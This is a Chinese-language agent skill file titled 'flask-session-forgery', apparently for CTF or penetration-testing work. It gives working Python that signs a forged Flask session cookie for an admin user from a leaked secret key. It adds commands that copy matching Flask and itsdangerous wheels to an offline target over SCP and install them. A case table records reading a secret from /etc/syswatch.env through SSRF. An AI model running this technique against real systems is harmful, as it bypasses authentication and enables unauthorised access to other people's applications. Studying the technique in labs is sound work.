---
name: 'flask-session-forgery'
description: 'Flask session 伪造：已知 secret key 但目标无外网时，下载匹配版本的 wheel 包 SCP 到目标生成有效 cookie'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---


# Flask Session 伪造实战

## 场景
拿到了 Flask secret key（如从 env 文件、源码泄漏），但无法直接登录（密码未知或已变），需要伪造 session cookie 通过认证。

## 核心问题：版本匹配

Flask session 的签名格式随 itsdangerous 版本变化。在 Kali 上生成的 session cookie 到目标可能无效，因为：
- itsdangerous 2.x 默认 `key_derivation='hmac'`
- Flask 3.x 使用 `SecureCookieSessionInterface` 的特定配置
- `salt='cookie-session'`、`digest_method=hashlib.sha1` 是关键参数

## 标准生成方法

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "THE_SECRET_KEY"
si = SecureCookieSessionInterface()
s = si.get_signing_serializer(app)
session_cookie = s.dumps({"user_id": 1, "username": "admin"})
```text

## 如果目标无外网（无法 pip install）

```bash
# Kali 上下载正确的 wheel 包
pip3 download flask==3.1.0 itsdangerous==2.2.0 --python-version 3.12 --only-binary=:all: -d /tmp/pkgs

# SCP 到目标
scp -i key /tmp/pkgs/*.whl user@target:/tmp/

# 目标上安装
pip3 install --break-system-packages /tmp/*.whl
```text

**版本确认**：从目标 HTTP 响应头获取 `Server: Werkzeug/X.Y.Z Python/A.B.C`，据此选择匹配的 Flask/itsdangerous 版本。

## DevArea 实战

| 信息 | 来源 |
|------|------|
| Secret key | `/etc/syswatch.env` (SSRF 读取) |
| Werkzeug 版本 | HTTP 响应 `Server: Werkzeug/3.1.4 Python/3.12.3` |
| 匹配的 itsdangerous | 2.2.0 |
| 有效 payload | `{"user_id": 1, "username": "admin"}` |

## 注意

1. **不要手动拼 HMAC** — 用 Flask 的 `get_signing_serializer()` 确保参数完全正确
2. **Secret key 可能有换行符** — env 文件读出来需要 `.strip()`
3. **session cookie 有时效性** — itsdangerous 的 `URLSafeTimedSerializer` 有时间戳，但 Flask session 默认不过期（`permanent=False`）
4. **`change-me` 是默认值** — 如果环境变量未设置，app.secret_key 会回退到代码中的默认值
